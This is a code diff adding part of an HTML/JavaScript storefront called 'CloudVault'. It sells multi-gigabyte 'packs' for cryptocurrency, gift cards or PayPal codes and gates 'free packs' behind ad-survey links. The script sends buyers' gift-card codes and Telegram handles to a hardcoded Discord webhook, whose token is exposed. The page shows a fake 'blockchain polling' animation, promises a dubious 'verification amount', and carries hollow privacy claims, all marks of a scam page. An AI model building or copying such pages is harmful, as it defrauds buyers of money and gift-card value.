+          <div class="pack-name">Free Pack B</div>
+          <div class="pack-size">34 GB storage</div>
+        </div>
+      </div>
+      <span class="free-badge">FREE</span>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: CHANNELS ========== -->
+  <div id="screen-channels" class="screen">
+    <button class="btn-back" onclick="goTo('screen-main')">← Back</button>
+    <div class="section-title">Official Channels</div>
+    <div class="channel-card">
+      <div class="channel-icon">✈️</div>
+      <div class="channel-info">
+        <div class="ch-name">CookieNew</div>
+        <div class="ch-handle">@cookienew — Telegram Channel</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer-note">
+    CloudVault does not collect or store IP addresses, browser fingerprints, or personal identifiers.<br>
+    Only payment data is processed for order fulfillment. All transfers are encrypted end-to-end.
+  </div>
+
+</div><!-- /container -->
+
+<!-- SURVEY MODAL -->
+<div class="modal-overlay" id="survey-modal">
+  <div class="modal">
+    <span class="modal-icon">📋</span>
+    <div class="modal-title">Unlock Your Free Pack</div>
+    <div class="modal-desc">The survey has opened in a new tab. Please complete it, then wait for the timer below to finish to unlock your download.</div>
+    <div class="timer-ring"></div>
+    <div class="timer-num" id="survey-timer">15</div>
+    <button class="smartlink-btn" id="smartlink-btn" onclick="deliverFreePack()">Download Pack</button>
+    <br>
+    <button class="close-modal" onclick="closeSurveyModal()">Close</button>
+  </div>
+</div>
+
+
+<script>
+// ===================================================
+// DATA
+// ===================================================
+const PACKS = [
+  { name:'Pack 1', size:'50 GB', price:'$10', priceNum:10 },
+  { name:'Pack 2', size:'120 GB', price:'$25', priceNum:25 },
+  { name:'Pack 3', size:'500 GB', price:'$60', priceNum:60 },
+  { name:'Pack 4', size:'2.1 TB', price:'$150', priceNum:150 },
+  { name:'Mega Cloud Folder', size:'5 TB', price:'$230', priceNum:230 }
+];
+
+const WALLETS = {
+  xmr: {
+    name:'Monero (XMR)',
+    icon:'🛡️',
+    address:'45dPYy15i4Wb9Prrid617Uj5YNbnTfUEgZNp6qqCgLDkZWam43aB2SK1iaS98C7UR79tXefdQnidnSwSsiPGXveaAWHL8gb',
+    explorer: null // Monero has no public block explorer link for addresses
+  },
+  btc: {
+    name:'Bitcoin (BTC)',
+    icon:'₿',
+    address:'bc1qn4e0dv6arghdwt23z2czrahzvphhvm24ctgsvn',
+    explorer:'https://blockchain.info/address/bc1qn4e0dv6arghdwt23z2czrahzvphhvm24ctgsvn'
+  },
+  eth: {
+    name:'Ethereum (ETH)',
+    icon:'⬡',
+    address:'0x54C97f773a00b902A53A7A66F2D3c9116B4114ec',
+    explorer:'https://etherscan.io/address/0x54C97f773a00b902A53A7A66F2D3c9116B4114ec'
+  },
+  usdt: {
+    name:'USDT via Ethereum (ERC-20)',
+    icon:'💵',
+    address:'0x54C97f773a00b902A53A7A66F2D3c9116B4114ec',
+    explorer:'https://etherscan.io/address/0x54C97f773a00b902A53A7A66F2D3c9116B4114ec'
+  },
+  sol: {
+    name:'Solana (SOL)',
+    icon:'◐',
+    address:'9jB4bCTGv1xobqgPMno7s8RRQDrx9ow8jnzUGfK85WpA',
+    explorer:'https://solscan.io/account/9jB4bCTGv1xobqgPMno7s8RRQDrx9ow8jnzUGfK85WpA'
+  }
+};
+
+const FREE_PACKS = [
+  { name:'Free Pack A', size:'34 GB', url:'https://getafilenow.com/1863729' },
+  { name:'Free Pack B', size:'34 GB', url:'https://fileflux.net/1866641' }
+];
+
+const SMARTLINK = 'https://omnioffers.com/1868395';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1463871742668837182/dxn0DfoP5U9sZtId9jYf8Q6n5BF4Fuhc024ssr_Q0Mz0cTt0Mp0zGRVf8B1eRmVFhE6k';
+
+// ===================================================
+// STATE
+// ===================================================
+let selectedPackIndex = 0;
+let selectedCoin = null;
+let selectedGiftType = null;
+let currentFreePack = null;
+let surveyTimerInterval = null;
+
+// ===================================================
+// NAVIGATION
+// ===================================================
+function goTo(screenId) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(screenId).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+// ===================================================
+// PACK SELECTION
+// ===================================================
+function selectPack(index) {
+  selectedPackIndex = index;
+  const pack = PACKS[index];
+  document.getElementById('summary-name').textContent = pack.name + ' — ' + pack.size;
+  document.getElementById('summary-price').textContent = pack.price;
+  goTo('screen-payment');
+}
+
+// ===================================================
+// CRYPTO WALLET VIEW
+// ===================================================
+function showWallet(coin) {
+  selectedCoin = coin;
+  const w = WALLETS[coin];
+  document.getElementById('wallet-title').textContent = 'Send ' + PACKS[selectedPackIndex].price + ' in ' + w.name;
+
+  let explorerHtml = '';
+  if (w.explorer) {
+    explorerHtml = '<a class="blockchain-link" href="' + w.explorer + '" target="_blank" rel="noopener">🔗 View on Block Explorer</a>';
+  } else {
+    explorerHtml = '<span style="font-family:\'Share Tech Mono\',monospace;font-size:10px;color:rgba(200,200,200,0.3);">Block explorer not available for Monero (privacy coin)</span>';
+  }
+
+  document.getElementById('wallet-detail').innerHTML =
+    '<div class="wallet-block">' +
+      '<div class="wallet-header">' +
+        '<div class="name"><span class="coin-icon">' + w.icon + '</span>' + w.name + '</div>' +
+      '</div>' +
+      '<div class="wallet-address">' +
+        '<button class="copy-btn" onclick="copyAddress(\''+w.address+'\')">Copy</button>' +
+        w.address +
+      '</div>' +
+      explorerHtml +
+    '</div>' +
+    '<div class="note-box mt14">' +
+      '<strong>Amount to send:</strong> ' + PACKS[selectedPackIndex].price + ' equivalent in ' + w.name + '.<br>' +
+      '<strong>After paying:</strong> Click the button below. A random verification amount will be sent to your crypto wallet — the <strong style="color:var(--green)">first 4 digits</strong> are your unique key. You will receive your download link via Telegram.' +
+    '</div>';
+
+  // Reset and show paid button after 10 seconds
+  const paidBtn = document.getElementById('paid-btn-crypto');
+  paidBtn.classList.remove('visible');
+  setTimeout(() => { paidBtn.classList.add('visible'); }, 10000);
+
+  goTo('screen-wallet');
+}
+
+function copyAddress(addr) {
+  navigator.clipboard.writeText(addr).then(() => {
+    const btns = document.querySelectorAll('.copy-btn');
+    btns.forEach(b => { b.textContent = 'Copied ✓'; setTimeout(() => { b.textContent = 'Copy'; }, 1500); });
+  });
+}
+
+// ===================================================
+// CRYPTO PAID — WEBHOOK + CONFIRM
+// ===================================================
+async function handleCryptoPaid() {
+  const tgUser = document.getElementById('tg-username').value.trim();
+  const pack = PACKS[selectedPackIndex];
+  const coin = WALLETS[selectedCoin];
+
+  const payload = {
+    content: '💰 **Crypto Payment Submitted**\n' +
+      '─────────────────────\n' +
+      '📦 Pack: ' + pack.name + ' (' + pack.size + ') — ' + pack.price + '\n' +
+      '🪙 Coin: ' + coin.name + '\n' +
+      '📍 Wallet: `' + coin.address + '`\n' +
+      '📱 Telegram: ' + (tgUser || 'Not provided') + '\n' +
+      '⏰ Time: ' + new Date().toISOString() + '\n' +
+      '─────────────────────\n' +
+      '⚠️ Awaiting on-chain confirmation. Verification amount will be sent.'
+  };
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+  } catch(e) { console.log('Webhook error', e); }
+
+  goTo('screen-crypto-confirm');
+}
+
+// ===================================================
+// GIFT CARD FLOW
+// ===================================================
+function selectGiftCard(type) {
+  selectedGiftType = type;
+  const labels = { paypal:'PayPal Rewardable', riot:'Riot Games', roblox:'Roblox', fortnite:'Fortnite', mastercard:'Virtual Mastercard', custom:'Custom' };
+  document.getElementById('gc-title').textContent = 'Enter ' + labels[type] + ' Code';
+
+  const customDiv = document.getElementById('gc-custom-type');
+  if (type === 'custom') { customDiv.style.display='block'; }
+  else { customDiv.style.display='none'; }
+
+  document.getElementById('gc-code').value = '';
+  goTo('screen-giftcard-input');
+}
+
+async function submitGiftCard() {
+  const code = document.getElementById('gc-code').value.trim();
+  const tgUser = document.getElementById('tg-username').value.trim();
+  const pack = PACKS[selectedPackIndex];
+  let typeName = selectedGiftType;
+  if (selectedGiftType === 'custom') {
+    typeName = document.getElementById('gc-custom-name').value.trim() || 'Custom';
+  }
+
+  if (!code) return;
+
+  const payload = {
+    content: '🎁 **Gift Card Payment Submitted**\n' +
+      '─────────────────────\n' +
+      '📦 Pack: ' + pack.name + ' (' + pack.size + ') — ' + pack.price + '\n' +
+      '🎟️ Gift Card Type: ' + typeName + '\n' +
+      '🔑 Code: `' + code + '`\n' +
+      '📱 Telegram: ' + (tgUser || 'Not provided') + '\n' +
+      '⏰ Time: ' + new Date().toISOString() + '\n' +
+      '─────────────────────\n' +
+      '⚠️ Awaiting admin verification.'
+  };
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+  } catch(e) { console.log('Webhook error', e); }
+
+  goTo('screen-gc-loading');
+}
+
+// ===================================================
+// PAYPAL FLOW
+// ===================================================
+async function submitPayPal() {
+  const code = document.getElementById('paypal-code').value.trim();
+  const tgUser = document.getElementById('tg-username').value.trim();
+  const pack = PACKS[selectedPackIndex];
+
+  if (!code) return;
+
+  const payload = {
+    content: '💳 **PayPal Payment Submitted**\n' +
+      '─────────────────────\n' +
+      '📦 Pack: ' + pack.name + ' (' + pack.size + ') — ' + pack.price + '\n' +
+      '🔑 Gift Card Code: `' + code + '`\n' +
+      '📱 Telegram: ' + (tgUser || 'Not provided') + '\n' +
+      '⏰ Time: ' + new Date().toISOString() + '\n' +
+      '─────────────────────\n' +
+      '⚠️ Awaiting admin verification.'
+  };
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+  } catch(e) { console.log('Webhook error', e); }
+
+  goTo('screen-gc-loading');
+}
+
+// ===================================================
+// FREE PACKS + SURVEY MODAL
+// ===================================================
+function triggerFreePack(index) {
+  currentFreePack = FREE_PACKS[index];
+  // Open the smartlink survey automatically first
+  window.open(SMARTLINK, '_blank', 'noopener,noreferrer');
+  // Then show the modal with the timer after a short delay
+  setTimeout(() => {
+    openSurveyModal();
+  }, 1200);
+}
+
+function openSurveyModal() {
+  const modal = document.getElementById('survey-modal');
+  modal.classList.add('active');
+
+  let remaining = 15;
+  document.getElementById('survey-timer').textContent = remaining;
+  document.getElementById('smartlink-btn').classList.remove('visible');
+
+  surveyTimerInterval = setInterval(() => {
+    remaining--;
+    document.getElementById('survey-timer').textContent = remaining;
+    if (remaining <= 0) {
+      clearInterval(surveyTimerInterval);
+      document.getElementById('smartlink-btn').classList.add('visible');
+    }
+  }, 1000);
+}
+
+function closeSurveyModal() {
+  document.getElementById('survey-modal').classList.remove('active');
+  if (surveyTimerInterval) { clearInterval(surveyTimerInterval); surveyTimerInterval = null; }
+}
+
+function deliverFreePack() {
+  // Send webhook for tracking
+  const payload = {
+    content: '🎁 **Free Pack — Delivered**\n' +
+      '📦 Pack: ' + (currentFreePack ? currentFreePack.name : 'Unknown') + '\n' +
+      '📎 Pack URL: ' + (currentFreePack ? currentFreePack.url : '') + '\n' +
+      '⏰ Time: ' + new Date().toISOString()
+  };
+  try {
+    fetch(WEBHOOK_URL, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+  } catch(e) {}
+
+  // Open the actual free pack download
+  if (currentFreePack) {
+    window.open(currentFreePack.url, '_blank', 'noopener,noreferrer');
+  }
+  closeSurveyModal();
+}
+
+function openSmartlink() {
+  // Send webhook for tracking free pack attempt
+  const payload = {
+    content: '🎁 **Free Pack — Survey Started**\n' +
+      '📦 Pack: ' + (currentFreePack ? currentFreePack.name : 'Unknown') + '\n' +
+      '📎 Pack URL: ' + (currentFreePack ? currentFreePack.url : '') + '\n' +
+      '⏰ Time: ' + new Date().toISOString()
+  };
+  try {
+    fetch(WEBHOOK_URL, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+  } catch(e) {}
+
+  // Open smartlink in new tab
+  window.open(SMARTLINK, '_blank', 'noopener,noreferrer');
+
+  // After a short delay, open the actual free pack link
+  setTimeout(() => {
+    if (currentFreePack) {
+      window.open(currentFreePack.url, '_blank', 'noopener,noreferrer');
+    }
+    closeSurveyModal();
+  }, 2500);
+}
+
+// ===================================================
+// BLOCKCHAIN POLLING (visual — pulses every 2s)
+// ===================================================
+setInterval(() => {
+  const dot = document.querySelector('.verify-dot');
+  if (dot) {
+    dot.style.opacity = '0.5';
+    setTimeout(() => { if(dot) dot.style.opacity = '1'; }, 400);
+  }
+}, 2000);
+
+</script>
+</body>
+</html>
